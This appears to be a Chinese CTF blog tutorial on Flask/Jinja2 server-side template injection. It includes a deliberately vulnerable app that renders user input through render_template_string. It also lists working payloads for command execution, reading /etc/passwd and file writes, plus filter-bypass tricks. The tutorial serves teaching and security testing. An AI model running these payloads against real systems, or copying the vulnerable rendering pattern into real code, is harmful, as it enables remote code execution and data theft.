@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Python Flask SSTI模板注入 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Python Flask SSTI模板注入</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p>SSTI</p>
+<!-- more -->
+<pre><code>ssti服务端模板注入，主要为python的一些框架，jinja2，mmako，tornado，django，等
+漏洞原理嘛。都是因为代码不严谨，信任用户输入，导致模板注入
+</code></pre>
+<p>模板：</p>
+<pre><code>模板就类似于PPT模板，现成的，只需要将内容填充进去就好了
+拿到数据，放进模板，渲染引擎将数据生成html文本，返回给浏览器
+</code></pre>
+<p>Flask使用：</p>
+<pre><code>from flask import *
+#导入模块
+app=Flask(__name__)
+#初始化模块
+@app.route('/')
+#路由，访问/，就会跳转到test函数，显示hello world!
+def test():
+    return &quot;hello world!&quot;
+#启动服务，绑定0.0.0.0的80端口
+app.run('0.0.0.0',80)
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1577953469825.png" alt="" loading="lazy"></figure>
+<pre><code>from flask import *
+#导入模块
+app=Flask(__name__)
+#初始化模块
+@app.route(&quot;/&lt;username&gt;&quot;)
+#路由，访问/，就会跳转到test函数，并将动态的username传入
+def test(username):
+#接收username，并且返回
+    return &quot;user:%s&quot;%username
+#启动服务，绑定0.0.0.0的80端口
+app.run('0.0.0.0',80)
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://guokeya.github.io/post-images/1577953486818.png" alt="" loading="lazy"></figure>
+<p>模板渲染：</p>
+<pre><code>flask是使用jinja2渲染引擎，渲染方法有render_template和render_template_string两种，前者是用来渲染文件的，后来则是渲染字符串，SSTI就和字符串有关
+文件格式：
+├── app.py  
+├── static  
+│   └── style.css  
+└── templates  
+    └── index.html
+使用方法如下:
+------------------------------------------index.html----------------------------------
+&lt;h1&gt;{{content}}&lt;h1&gt;
+-------------------------------------------app.py---------------------------------------
+from flask import *
+app=Flask(__name__)
+@app.route(&quot;/&quot;)
+def test():
+    return render_template('index.html',content='This is Test Web!')
+app.run('0.0.0.0',80)
+#当访问/的时候，渲染引擎就会将content对应的值，放入html模板中
+#{{}}是变量包裹标识符，不仅可以传递变量，还能传递一些简单的表达式
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://guokeya.github.io/post-images/1577953513566.png" alt="" loading="lazy"></figure>
+<pre><code>接下来就要开始动态的字符串渲染了。开始SSTI
+from flask import *
+app=Flask(__name__)
+@app.route(&quot;/&quot;)
+def test():
+    code=request.args.get('id')
+    #接收get的id值
+    html='&lt;h1&gt;hello : %s&lt;/h1&gt;'%(code)
+    #放入html
+    return render_template_string(html)
+    #渲染输出
+app.run('0.0.0.0',80)
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577953526804.png" alt="" loading="lazy"><br>
+我们输出恶意的JS代码时，它也会原样输出<br>
+<img src="https://guokeya.github.io/post-images/1577953539408.png" alt="" loading="lazy"></p>
+<pre><code>这段代码的危害，可不止XSS
+之前讲了，在{{}}，可以输入一些表达式，{{2*4}}会输出8
+当输出{{config}}时，就会输出flask的全局变量
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://guokeya.github.io/post-images/1577953557936.png" alt="" loading="lazy"></figure>
+<pre><code>在python中，object类是python中所有类的基类，定义一个类时，没指定继承哪个类，则默认继承object类,ssti大部分都是依靠基类-&gt;子类-&gt;危险函数来利用
+下面开始介绍什么是类。什么是基类等。
+__class__
+#class用于返回该对象所属的类。比如字符串，它的对象就是字符串对象，类是&lt;class 'str'&gt;
+__bases__
+#bases用于以元组方式返回该对象的继承的基类
+__mro__
+#mro用于返回一个对象所继承的基类元组，和bases差不多
+__subclasses__()
+#subclasses用于获取类的所有子类，一般都是用这个去获取一个类下的其他模块
+__init__
+#init，类的初始化
+__globals__
+#globals用来获取function所处空间下所有可使用的module，方法，变量
+</code></pre>
+<p><code>[].__class__</code><br>
+返回了&lt;type 'list'&gt;,对于一个列表，它利用class来返回类，list类，而每个类都有一个bases属性，列出基类，这些都不重要，我们的目标是，通过这些，获得object类<br>
+<img src="https://guokeya.github.io/post-images/1577953591762.png" alt="" loading="lazy"><br>
+<code>[].__class__.__bases__</code><br>
+返回了(&lt;type 'object'&gt;,),对于一个list，用bases返回基类，成功获取到object类，这里是以元组输出的,[0]才是object<br>
+<img src="https://guokeya.github.io/post-images/1577953598219.png" alt="" loading="lazy"><br>
+<code>[].__class__.__mro__</code><br>
+我们也可以用mro来返回object,mro会返回两个<br>
+<img src="https://guokeya.github.io/post-images/1577953618171.png" alt="" loading="lazy"><br>
+<code>[].__class__.__bases__[0].__subclasses__()</code><br>
+我们使用subclasses这个方法来返回类的子类，也就是object类子类的集合，里面包含了file，os等子类，调用即可执行命令等<br>
+<img src="https://guokeya.github.io/post-images/1577953642015.png" alt="" loading="lazy"><br>
+<code>[].__class__.__bases__[0].__subclasses__()[40]</code><br>
+这里调用了第40个子类，返回的file<br>
+<code>[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()</code><br>
+相当于file('/etc/passwd').read()<br>
+<img src="https://guokeya.github.io/post-images/1577953665008.png" alt="" loading="lazy"><br>
+<strong>Python2</strong></p>
+<pre><code>                                命令执行
+[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']].__dict__.values()[12].__dict__.values()[144]('whoami')
+&quot;&quot;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()')
+{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()
+''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
+object.__subclasses__()[40]('/etc/passwd').read()
+().__class__.__mro__[1].__subclasses__()[59].__init__.__getattribute__('func_gl'+'obals')[&quot;linecache&quot;].__dict__['o'+'s'].__dict__['popen']('who'+'ami').read()
+'i34jtnfdi02\\administrator\n'
+#由于我们都是要获取object类。那么直接给他object类开头。就会简短很多
+</code></pre>
+<pre><code>                                文件读取
+''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
+[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
+[i.read()for(i)in[0x1.__class__.__base__.__subclasses__()[40]('/etc/passwd')]]
+sys.stderr.__class__('/etc/passwd').read()
+sys.stderr.write(sys.stderr.__class__('/etc/passwd').read())
+</code></pre>
+<pre><code>                                文件写入
+[].__class__.__bases__[0].__subclasses__()[40]('/tmp/test.txt','a').write('f;ag{123}')
+</code></pre>
+<p><strong>Python3</strong></p>
+<pre><code>                                命令执行
+[].__class__.__base__.__subclasses__()[118].__init__.__globals__['popen']('whoami').read()
+[].__class__.__base__.__subclasses__()[185].__init__.__globals__['os'].popen('whoami').read()
+</code></pre>
+<p>payload千变万化。思路都一样。只要获取到object对象，然后选一个能执行命令的模块，调用即可，比如eval，os等，都可以<br>
+寻找包含os模块的脚本</p>
+<pre><code>num=0
+for i in ''.__class__.__mro__[2].__subclasses__():
+    try:
+        if 'os' in i.__init__.__globals__:
+            if 'os' in i.__init__.__globals__:
+                print &quot;''.__class__.__mro__[2].__subclasses__()[&quot;+str(num)+&quot;].__init__.__globals__['os']&quot;
+    except:
+        pass
+    num+=1
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577953728850.png" alt="" loading="lazy"><br>
+下面介绍下过滤某些字符的绕过</p>
+<pre><code>[]
+用__gititem__绕过
+&quot;&quot;.__class__.__mro__[2]
+&quot;&quot;.__class__.__mro__.__getitem__(2)
+当返回值是数组时。可以使用pop(40)来获取
+''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)
+</code></pre>
+<pre><code>黑名单
+request对象绕过
+id={{&quot;&quot;[request.args.a]}}&amp;a=__class__
+</code></pre>
+<pre><code>过滤.
+字典绕过
+{{&quot;&quot;[&quot;__class__&quot;][&quot;__mro__&quot;]}}
+</code></pre>
+<pre><code>过滤class等关键字
+拼接绕过
+{{&quot;&quot;[&quot;__cla&quot;+&quot;ss__&quot;]}}
+在本机python上打不行，通过web可以执行
+</code></pre>
+<pre><code>当删除了import等方法后。payload不可使用
+reload('__builtins__')
+可以恢复
+</code></pre>
+<p>参考文章:<br>
+https://p0sec.net/index.php/archives/120/<br>
+https://xz.aliyun.com/t/6885<br>
+https://xz.aliyun.com/t/3679#toc-1<br>
+https://www.freebuf.com/column/187845.html</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/jjD9b5sxT/">
+                  <h3 class="post-title">
+                    PHP mt_rand 随机数安全
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
